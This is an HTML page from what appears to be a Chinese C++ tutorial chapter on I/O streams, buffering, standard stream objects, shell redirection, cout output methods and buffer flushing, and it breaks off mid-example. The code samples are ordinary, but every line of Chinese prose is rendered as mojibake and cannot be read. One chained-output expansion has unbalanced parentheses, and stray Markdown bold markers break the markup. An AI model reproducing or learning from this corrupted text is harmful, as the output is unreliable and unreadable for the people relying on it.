æ“ä½œé€šå¸¸æ¶‰åŠç‰©ç†è®¾å¤‡ï¼ˆå¦‚ç¡¬ç›˜ã€å±å¹•ï¼‰ï¼Œè¿™äº›è®¾å¤‡çš„é€Ÿåº¦å¾€å¾€æ¯” CPU å’Œå†…å­˜æ…¢å¾—å¤šã€‚ä¸ºäº†æé«˜æ•ˆç‡ï¼Œæ•°æ®é€šå¸¸ä¸ä¼šåœ¨ç¨‹åºå’Œè®¾å¤‡ä¹‹é—´é€ä¸ªå­—èŠ‚åœ°ä¼ è¾“ï¼Œè€Œæ˜¯å…ˆæš‚å­˜åœ¨ç¼“å†²åŒºä¸­ï¼š</p><ul><li>  <strong>è¾“å‡º:</strong> å½“ç¨‹åºæ‰§è¡Œè¾“å‡ºæ“ä½œæ—¶ï¼ˆä¾‹å¦‚ä½¿ç”¨ <code>cout &lt;&lt;</code>ï¼‰ï¼Œæ•°æ®é€šå¸¸å…ˆè¢«å‘é€åˆ°è¾“å‡ºç¼“å†²åŒºã€‚å½“ç¼“å†²åŒºæ»¡äº†ã€é‡åˆ°æ¢è¡Œç¬¦ï¼ˆå¯¹äºè¡Œç¼“å†²çš„æµï¼‰ã€ç¨‹åºç»“æŸæˆ–æ˜¾å¼åˆ·æ–°ç¼“å†²åŒºæ—¶ï¼Œç¼“å†²åŒºä¸­çš„å†…å®¹æ‰ä¼šè¢«ä¸€æ¬¡æ€§åœ°ä¼ è¾“åˆ°æœ€ç»ˆçš„è¾“å‡ºè®¾å¤‡ã€‚</li><li>  <strong>è¾“å…¥:</strong> å½“ç¨‹åºè¯·æ±‚è¾“å…¥æ—¶ï¼ˆä¾‹å¦‚ä½¿ç”¨ <code>cin &gt;&gt;</code>ï¼‰ï¼Œç³»ç»Ÿå¯èƒ½ä¼šä¸€æ¬¡æ€§ä»è¾“å…¥è®¾å¤‡è¯»å–æ¯”ç¨‹åºè¯·æ±‚çš„æ›´å¤šçš„æ•°æ®ï¼Œå¹¶å°†å…¶å­˜å‚¨åœ¨è¾“å…¥ç¼“å†²åŒºä¸­ã€‚ç¨‹åºéšåä»ç¼“å†²åŒºä¸­è·å–æ‰€éœ€çš„æ•°æ®ã€‚å¦‚æœç¼“å†²åŒºä¸ºç©ºï¼Œç¨‹åºä¼šç­‰å¾…è¾“å…¥è®¾å¤‡æä¾›æ•°æ®ã€‚</li></ul><p><strong>ä½¿ç”¨ç¼“å†²åŒºçš„å¥½å¤„:</strong></p><ul><li>  <strong>æé«˜æ•ˆç‡:</strong> å‡å°‘äº†ä¸æ…¢é€Ÿ I/O è®¾å¤‡çš„ç›´æ¥äº¤äº’æ¬¡æ•°ã€‚</li><li>  <strong>å¹³æ»‘æ•°æ®æµ:</strong> å…è®¸ç¨‹åºå’Œè®¾å¤‡ä»¥å„è‡ªçš„é€Ÿåº¦å·¥ä½œã€‚</li></ul><p><strong>ç¼“å†²åŒºçš„ç±»å‹:</strong></p><ul><li>  <strong>å®Œå…¨ç¼“å†² (Fully Buffered):</strong> åªæœ‰å½“ç¼“å†²åŒºæ»¡äº†ï¼Œæˆ–è€…æ˜¾å¼åˆ·æ–°æ—¶ï¼Œæ‰ä¼šè¿›è¡Œå®é™…çš„ I/O æ“ä½œï¼ˆé€šå¸¸ç”¨äºæ–‡ä»¶ I/Oï¼‰ã€‚</li><li>  <strong>è¡Œç¼“å†² (Line Buffered):</strong> é™¤äº†ç¼“å†²åŒºæ»¡æˆ–æ˜¾å¼åˆ·æ–°å¤–ï¼Œé‡åˆ°æ¢è¡Œç¬¦ (<code>\n</code>) æ—¶ä¹Ÿä¼šè¿›è¡Œ I/O æ“ä½œï¼ˆé€šå¸¸ç”¨äºæ ‡å‡†è¾“å‡º <code>cout</code>ï¼Œå½“å®ƒè¿æ¥åˆ°ç»ˆç«¯æ—¶ï¼‰ã€‚</li><li>  <strong>æ— ç¼“å†² (Unbuffered):</strong> æ•°æ®å°½å¿«è¿›è¡Œå®é™…çš„ I/O æ“ä½œï¼ˆé€šå¸¸ç”¨äºæ ‡å‡†é”™è¯¯è¾“å‡º <code>cerr</code>ï¼Œä»¥ç¡®ä¿é”™è¯¯ä¿¡æ¯èƒ½ç«‹å³æ˜¾ç¤ºï¼‰ã€‚</li></ul><h3 id="17-1-2-æµã€ç¼“å†²åŒºå’Œ-iostream-æ–‡ä»¶"><a href="#17-1-2-æµã€ç¼“å†²åŒºå’Œ-iostream-æ–‡ä»¶" class="headerlink" title="17.1.2 æµã€ç¼“å†²åŒºå’Œ iostream æ–‡ä»¶"></a>17.1.2 æµã€ç¼“å†²åŒºå’Œ iostream æ–‡ä»¶</h3><p>C++ çš„ I/O åŠŸèƒ½ä¸»è¦å®šä¹‰åœ¨ <code>&lt;iostream&gt;</code> å¤´æ–‡ä»¶ä¸­ï¼ˆä»¥åŠå…¶ä»–ç›¸å…³å¤´æ–‡ä»¶å¦‚ <code>&lt;fstream&gt;</code>, <code>&lt;sstream&gt;</code>ï¼‰ã€‚<code>&lt;iostream&gt;</code> å®šä¹‰äº†ä¸€ç³»åˆ—ç”¨äºå¤„ç†æµçš„ç±»å’Œå¯¹è±¡ã€‚</p><p><strong>æ ¸å¿ƒ I/O ç±»åº“:</strong></p><ul><li>  <strong><code>ios_base</code>:</strong> æä¾›äº†ä¸æµæ— å…³çš„åŸºæœ¬å±æ€§å’Œæ–¹æ³•ï¼ˆå¦‚æ ¼å¼åŒ–æ ‡å¿—ã€æµçŠ¶æ€ï¼‰ã€‚</li><li>  <strong><code>ios</code>:</strong> åŸºäº <code>ios_base</code>ï¼Œå¢åŠ äº†ä¸å…·ä½“å­—ç¬¦ç±»å‹ç›¸å…³çš„é”™è¯¯çŠ¶æ€ä¿¡æ¯ã€‚</li><li>  <strong><code>ostream</code>:</strong> åŸºäº <code>ios</code>ï¼Œæä¾›äº†<strong>è¾“å‡ºæµ</strong>çš„åŠŸèƒ½ï¼ˆå¦‚ <code>operator&lt;&lt;</code>, <code>put()</code>, <code>write()</code>ï¼‰ã€‚</li><li>  <strong><code>istream</code>:</strong> åŸºäº <code>ios</code>ï¼Œæä¾›äº†<strong>è¾“å…¥æµ</strong>çš„åŠŸèƒ½ï¼ˆå¦‚ <code>operator&gt;&gt;</code>, <code>get()</code>, <code>getline()</code>, <code>read()</code>ï¼‰ã€‚</li><li>  <strong><code>iostream</code>:</strong> åŒæ—¶ç»§æ‰¿è‡ª <code>istream</code> å’Œ <code>ostream</code>ï¼Œæ”¯æŒè¾“å…¥å’Œè¾“å‡ºæ“ä½œã€‚</li></ul><p><strong>æ ‡å‡†æµå¯¹è±¡:</strong> <code>&lt;iostream&gt;</code> è¿˜å®šä¹‰äº†å‡ ä¸ªé¢„å®šä¹‰çš„å…¨å±€æµå¯¹è±¡ï¼Œç”¨äºå¤„ç†æ ‡å‡†è¾“å…¥å’Œè¾“å‡ºï¼š</p><ul><li>  <strong><code>cin</code> (console input):</strong> <code>istream</code> ç±»çš„å¯¹è±¡ï¼Œé€šå¸¸è¿æ¥åˆ°<strong>æ ‡å‡†è¾“å…¥è®¾å¤‡</strong>ï¼ˆé”®ç›˜ï¼‰ã€‚</li><li>  <strong><code>cout</code> (console output):</strong> <code>ostream</code> ç±»çš„å¯¹è±¡ï¼Œé€šå¸¸è¿æ¥åˆ°<strong>æ ‡å‡†è¾“å‡ºè®¾å¤‡</strong>ï¼ˆå±å¹•ï¼‰ã€‚å®ƒé€šå¸¸æ˜¯<strong>è¡Œç¼“å†²</strong>çš„ã€‚</li><li>  <strong><code>cerr</code> (console error):</strong> <code>ostream</code> ç±»çš„å¯¹è±¡ï¼Œé€šå¸¸è¿æ¥åˆ°<strong>æ ‡å‡†é”™è¯¯è®¾å¤‡</strong>ï¼ˆå±å¹•ï¼‰ã€‚å®ƒé€šå¸¸æ˜¯<strong>æ— ç¼“å†²</strong>çš„ï¼Œç”¨äºç«‹å³æ˜¾ç¤ºé”™è¯¯æ¶ˆæ¯ã€‚</li><li>  <strong><code>clog</code> (console log):</strong> <code>ostream</code> ç±»çš„å¯¹è±¡ï¼Œä¹Ÿé€šå¸¸è¿æ¥åˆ°æ ‡å‡†é”™è¯¯è®¾å¤‡ã€‚ä½†å®ƒé€šå¸¸æ˜¯<strong>ç¼“å†²</strong>çš„ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // åŒ…å« iostream ä»¥ä½¿ç”¨ cin, cout, cerr, clog</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter your age: &quot;</span>; <span class="comment">// ä½¿ç”¨ cout è¾“å‡ºæç¤ºä¿¡æ¯åˆ°æ ‡å‡†è¾“å‡º</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; age;                 <span class="comment">// ä½¿ç”¨ cin ä»æ ‡å‡†è¾“å…¥è¯»å–æ•´æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (age &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Age cannot be negative.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// ä½¿ç”¨ cerr è¾“å‡ºé”™è¯¯ä¿¡æ¯åˆ°æ ‡å‡†é”™è¯¯</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">clog</span> &lt;&lt; <span class="string">&quot;Log: Invalid age entered.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;     <span class="comment">// ä½¿ç”¨ clog è¾“å‡ºæ—¥å¿—ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;You entered: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡ºç»“æœåˆ°æ ‡å‡†è¾“å‡º</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™äº›æ ‡å‡†æµå¯¹è±¡ä½¿å¾—åŸºæœ¬çš„æ§åˆ¶å° I/O éå¸¸æ–¹ä¾¿ã€‚</p><h3 id="17-1-3-é‡å®šå‘"><a href="#17-1-3-é‡å®šå‘" class="headerlink" title="17.1.3 é‡å®šå‘"></a>17.1.3 é‡å®šå‘</h3><p>è®¸å¤šæ“ä½œç³»ç»Ÿï¼ˆå¦‚ Linux, macOS, Windowsï¼‰æ”¯æŒ<strong>I/O é‡å®šå‘ (Redirection)**ã€‚é‡å®šå‘å…è®¸ä½ æ”¹å˜ç¨‹åºçš„æ ‡å‡†è¾“å…¥æ¥æºå’Œæ ‡å‡†è¾“å‡º/æ ‡å‡†é”™è¯¯çš„ç›®çš„åœ°ï¼Œè€Œ</strong>æ— éœ€ä¿®æ”¹ç¨‹åºä»£ç **ã€‚</p><ul><li><p><strong>è¾“å‡ºé‡å®šå‘ (<code>&gt;</code>):</strong> å°†ç¨‹åºçš„æ ‡å‡†è¾“å‡ºï¼ˆ<code>cout</code> çš„å†…å®¹ï¼‰å‘é€åˆ°æŒ‡å®šæ–‡ä»¶ï¼Œè€Œä¸æ˜¯å±å¹•ã€‚å¦‚æœæ–‡ä»¶å·²å­˜åœ¨ï¼Œé€šå¸¸ä¼šè¦†ç›–å®ƒã€‚</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./my_program &gt; output.txt</span><br></pre></td></tr></table></figure><p>  æ‰§è¡Œ <code>my_program</code>ï¼Œå…¶ <code>cout</code> è¾“å‡ºçš„å†…å®¹å°†å†™å…¥ <code>output.txt</code> æ–‡ä»¶ã€‚</p></li><li><p><strong>è¾“å‡ºé‡å®šå‘ï¼ˆè¿½åŠ  <code>&gt;&gt;</code>):</strong> å°†ç¨‹åºçš„æ ‡å‡†è¾“å‡ºè¿½åŠ åˆ°æŒ‡å®šæ–‡ä»¶çš„æœ«å°¾ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºå®ƒã€‚</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./my_program &gt;&gt; output.txt</span><br></pre></td></tr></table></figure></li><li><p><strong>è¾“å…¥é‡å®šå‘ (<code>&lt;</code>):</strong> ä½¿ç¨‹åºä»æŒ‡å®šæ–‡ä»¶è¯»å–å…¶æ ‡å‡†è¾“å…¥ï¼ˆ<code>cin</code> çš„å†…å®¹ï¼‰ï¼Œè€Œä¸æ˜¯ä»é”®ç›˜ã€‚</p>  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./my_program &lt; input.txt</span><br></pre></td></tr></table></figure><p>  <code>my_program</code> ä¼šä» <code>input.txt</code> æ–‡ä»¶ä¸­è¯»å–å®ƒæœŸæœ›é€šè¿‡ <code>cin</code> è·å¾—çš„æ•°æ®ã€‚</p></li><li><p><strong>é”™è¯¯é‡å®šå‘:</strong> é‡å®šå‘æ ‡å‡†é”™è¯¯ (<code>cerr</code>, <code>clog</code>) çš„æ–¹å¼å›  shell è€Œå¼‚ã€‚</p><ul><li><strong>bash/sh/zsh:</strong> ä½¿ç”¨ <code>2&gt;</code> (è¦†ç›–) æˆ– <code>2&gt;&gt;</code> (è¿½åŠ )ã€‚  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./my_program 2&gt; error.log          <span class="comment"># é‡å®šå‘ stderr åˆ° error.log</span></span><br><span class="line">./my_program &gt; output.txt 2&gt; error.log <span class="comment"># é‡å®šå‘ stdout å’Œ stderr</span></span><br><span class="line">./my_program &gt; combined.log 2&gt;&amp;1   <span class="comment"># å°† stderr é‡å®šå‘åˆ° stdoutï¼Œç„¶åä¸€èµ·é‡å®šå‘åˆ°æ–‡ä»¶</span></span><br></pre></td></tr></table></figure></li><li>  <strong>Windows (cmd.exe):</strong> ç±»ä¼¼åœ°ä½¿ç”¨ <code>2&gt;</code> å’Œ <code>2&gt;&gt;</code>ã€‚</li></ul></li></ul><p>é‡å®šå‘æ˜¯ä¸€ä¸ªå¼ºå¤§çš„å·¥å…·ï¼Œå®ƒå…è®¸æˆ‘ä»¬å°†ç¨‹åºçš„è¾“å…¥å’Œè¾“å‡ºä¸æ–‡ä»¶è¿æ¥èµ·æ¥ï¼Œæ–¹ä¾¿è¿›è¡Œæµ‹è¯•ã€æ—¥å¿—è®°å½•å’Œæ•°æ®å¤„ç†ï¼Œè€Œæ— éœ€ä¿®æ”¹ç¨‹åºæœ¬èº«æ¥å¤„ç†æ–‡ä»¶ I/Oã€‚ç¨‹åºä»ç„¶ä½¿ç”¨ <code>cin</code>, <code>cout</code>, <code>cerr</code>ï¼Œä½†æ“ä½œç³»ç»Ÿè´Ÿè´£å°†è¿™äº›æ ‡å‡†æµè¿æ¥åˆ°æ–‡ä»¶ã€‚</p><h2 id="17-2-ä½¿ç”¨-cout-è¿›è¡Œè¾“å‡º"><a href="#17-2-ä½¿ç”¨-cout-è¿›è¡Œè¾“å‡º" class="headerlink" title="17.2 ä½¿ç”¨ cout è¿›è¡Œè¾“å‡º"></a>17.2 ä½¿ç”¨ cout è¿›è¡Œè¾“å‡º</h2><p><code>std::cout</code> æ˜¯ C++ æ ‡å‡†åº“ <code>&lt;iostream&gt;</code> ä¸­é¢„å®šä¹‰çš„ä¸€ä¸ª <code>ostream</code> ç±»çš„å…¨å±€å¯¹è±¡ï¼Œé€šå¸¸è¿æ¥åˆ°æ ‡å‡†è¾“å‡ºè®¾å¤‡ï¼ˆå¦‚å±å¹•ï¼‰ã€‚å®ƒæ˜¯ C++ ä¸­æœ€å¸¸ç”¨çš„è¾“å‡ºå·¥å…·ã€‚</p><h3 id="17-2-1-é‡è½½çš„-lt-lt-è¿ç®—ç¬¦"><a href="#17-2-1-é‡è½½çš„-lt-lt-è¿ç®—ç¬¦" class="headerlink" title="17.2.1 é‡è½½çš„ &lt;&lt; è¿ç®—ç¬¦"></a>17.2.1 é‡è½½çš„ &lt;&lt; è¿ç®—ç¬¦</h3><p><code>cout</code> æœ€å¸¸è§çš„ç”¨æ³•æ˜¯é…åˆ<strong>æ’å…¥è¿ç®—ç¬¦ (<code>&lt;&lt;</code>)</strong> ä½¿ç”¨ã€‚è¿™ä¸ªè¿ç®—ç¬¦è¢«<strong>é‡è½½ (overloaded)</strong> ä»¥æ¥å— C++ ä¸­æ‰€æœ‰çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆå¦‚ <code>int</code>, <code>float</code>, <code>double</code>, <code>char</code>, æŒ‡é’ˆç±»å‹ï¼‰ä»¥åŠä¸€äº›åº“ç±»å‹ï¼ˆå¦‚ <code>std::string</code>, C é£æ ¼å­—ç¬¦ä¸² <code>const char*</code>ï¼‰ã€‚</p><p><strong>å·¥ä½œåŸç†:</strong></p><ul><li>  <code>cout &lt;&lt; value;</code> è¡¨è¾¾å¼çš„å€¼æ˜¯ <code>cout</code> å¯¹è±¡æœ¬èº« (<code>ostream&amp;</code>)ã€‚</li><li>  è¿™ä½¿å¾—å¯ä»¥<strong>é“¾æ¥ (chain)</strong> å¤šä¸ªæ’å…¥è¿ç®—ç¬¦ï¼š<code>cout &lt;&lt; &quot;Value: &quot; &lt;&lt; x &lt;&lt; &quot; and &quot; &lt;&lt; y;</code>ã€‚è¿™ä¼šè¢«è§£é‡Šä¸º <code>((cout &lt;&lt; &quot;Value: &quot;) &lt;&lt; x) &lt;&lt; &quot; and &quot;) &lt;&lt; y;</code>ã€‚</li><li>  <code>&lt;&lt;</code> è¿ç®—ç¬¦ä¼šæ ¹æ® <code>value</code> çš„ç±»å‹ï¼Œå°†å…¶è½¬æ¢ä¸ºé€‚å½“çš„å­—ç¬¦è¡¨ç¤ºå½¢å¼ï¼Œå¹¶å‘é€åˆ°è¾“å‡ºæµï¼ˆé€šå¸¸å…ˆåˆ°ç¼“å†²åŒºï¼‰ã€‚</li></ul><p><strong>ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">double</span> weight = <span class="number">65.5</span>;</span><br><span class="line">    <span class="keyword">char</span> initial = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* name = <span class="string">&quot;John Doe&quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> city = <span class="string">&quot;New York&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Basic Output ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// endl æ’å…¥æ¢è¡Œç¬¦å¹¶åˆ·æ–°ç¼“å†²åŒº</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial: &quot;</span> &lt;&lt; initial &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span> &lt;&lt; age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Weight: &quot;</span> &lt;&lt; weight &lt;&lt; <span class="string">&quot; kg&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;City: &quot;</span> &lt;&lt; city &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é“¾æ¥è¾“å‡º</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\n--- Chained Output ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; (&quot;</span> &lt;&lt; initial &lt;&lt; <span class="string">&quot;), age &quot;</span> &lt;&lt; age</span><br><span class="line">              &lt;&lt; <span class="string">&quot;, lives in &quot;</span> &lt;&lt; city &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡ºæŒ‡é’ˆåœ°å€ (é€šå¸¸ä»¥åå…­è¿›åˆ¶æ˜¾ç¤º)</span></span><br><span class="line">    <span class="keyword">int</span>* ptr_age = &amp;age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nAddress of age: &quot;</span> &lt;&lt; ptr_age &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯¹äºç”¨æˆ·è‡ªå®šä¹‰çš„ç±»ç±»å‹ï¼Œå¦‚æœæƒ³è®© <code>cout &lt;&lt; myObject;</code> èƒ½å¤Ÿå·¥ä½œï¼Œéœ€è¦ä¸ºè¯¥ç±»é‡è½½ <code>operator&lt;&lt;</code>ï¼ˆé€šå¸¸ä½œä¸ºå‹å…ƒå‡½æ•°ï¼‰ï¼Œå¦‚ç¬¬ 11 ç« æ‰€è¿°ã€‚</p><h3 id="17-2-2-å…¶ä»–-ostream-æ–¹æ³•"><a href="#17-2-2-å…¶ä»–-ostream-æ–¹æ³•" class="headerlink" title="17.2.2 å…¶ä»– ostream æ–¹æ³•"></a>17.2.2 å…¶ä»– ostream æ–¹æ³•</h3><p>é™¤äº† <code>&lt;&lt;</code> è¿ç®—ç¬¦ï¼Œ<code>ostream</code> ç±»ï¼ˆ<code>cout</code> æ˜¯å…¶å¯¹è±¡ï¼‰è¿˜æä¾›äº†å…¶ä»–è¾“å‡ºæ–¹æ³•ï¼š</p><ul><li><p><strong><code>put(char c)</code>:</strong> è¾“å‡º<strong>å•ä¸ªå­—ç¬¦</strong> <code>c</code>ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span>.put(<span class="string">&#x27;H&#x27;</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span>.put(<span class="string">&#x27;i&#x27;</span>);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span>.put(<span class="string">&#x27;!&#x27;</span>).put(<span class="string">&#x27;\n&#x27;</span>); <span class="comment">// put() ä¹Ÿè¿”å› ostream&amp;ï¼Œå¯ä»¥é“¾æ¥</span></span><br></pre></td></tr></table></figure></li><li><p><strong><code>write(const char* s, streamsize n)</code>:</strong> è¾“å‡ºä»åœ°å€ <code>s</code> å¼€å§‹çš„<strong>å†…å­˜å—</strong>ä¸­çš„ <code>n</code> ä¸ªå­—èŠ‚ã€‚å®ƒ<strong>ä¸ä¼š</strong>åœ¨é‡åˆ°ç©ºå­—ç¬¦ <code>\0</code> æ—¶åœæ­¢ï¼Œè€Œæ˜¯ç²¾ç¡®åœ°å†™å…¥ <code>n</code> ä¸ªå­—èŠ‚ã€‚è¿™å¯¹äºè¾“å‡ºäºŒè¿›åˆ¶æ•°æ®æˆ–éç©ºå­—ç¬¦ç»“å°¾çš„å­—ç¬¦æ•°ç»„å¾ˆæœ‰ç”¨ã€‚</p>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* message = <span class="string">&quot;Binary Data&quot;</span>;</span><br><span class="line"><span class="comment">// è¾“å‡ºå‰ 6 ä¸ªå­—èŠ‚ &quot;Binary&quot;</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span>.write(message, <span class="number">6</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buffer[] = &#123;<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>&#125;;</span><br><span class="line"><span class="comment">// è¾“å‡ºæ•´ä¸ª buffer çš„ 5 ä¸ªå­—èŠ‚ï¼ŒåŒ…æ‹¬ç©ºå­—ç¬¦</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span>.write(buffer, <span class="keyword">sizeof</span>(buffer)) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="17-2-3-åˆ·æ–°è¾“å‡ºç¼“å†²åŒº"><a href="#17-2-3-åˆ·æ–°è¾“å‡ºç¼“å†²åŒº" class="headerlink" title="17.2.3 åˆ·æ–°è¾“å‡ºç¼“å†²åŒº"></a>17.2.3 åˆ·æ–°è¾“å‡ºç¼“å†²åŒº</h3><p>å¦‚å‰æ‰€è¿°ï¼Œè¾“å‡ºé€šå¸¸æ˜¯ç¼“å†²çš„ã€‚æœ‰æ—¶æˆ‘ä»¬éœ€è¦ç¡®ä¿ç¼“å†²åŒºä¸­çš„å†…å®¹ç«‹å³è¢«å‘é€åˆ°è¾“å‡ºè®¾å¤‡ï¼Œè¿™ç§°ä¸º<strong>åˆ·æ–° (Flushing)</strong> ç¼“å†²åŒºã€‚</p><p>æœ‰å‡ ç§æ–¹æ³•å¯ä»¥åˆ·æ–° <code>cout</code> çš„ç¼“å†²åŒºï¼š</p><ol><li><p><strong><code>std::endl</code> (Manipulator):</strong> è¿™æ˜¯æœ€å¸¸ç”¨çš„æ–¹æ³•ã€‚<code>endl</code> ä¸ä»…å‘æµä¸­æ’å…¥ä¸€ä¸ª<strong>æ¢è¡Œç¬¦ (<code>\n</code>)**ï¼Œè¿˜ä¼š</strong>æ˜¾å¼åˆ·æ–°**è¾“å‡ºç¼“å†²åŒºã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Line 1&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º &quot;Line 1&quot;ï¼Œæ¢è¡Œï¼Œå¹¶åˆ·æ–°</span></span><br></pre></td></tr></table></figure></li><li><p><strong><code>std::flush</code> (Manipulator):</strong> <strong>åªåˆ·æ–°</strong>è¾“å‡ºç¼“å†²åŒºï¼Œ<strong>ä¸æ’å…¥</strong>ä»»ä½•å­—ç¬¦ã€‚</p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span 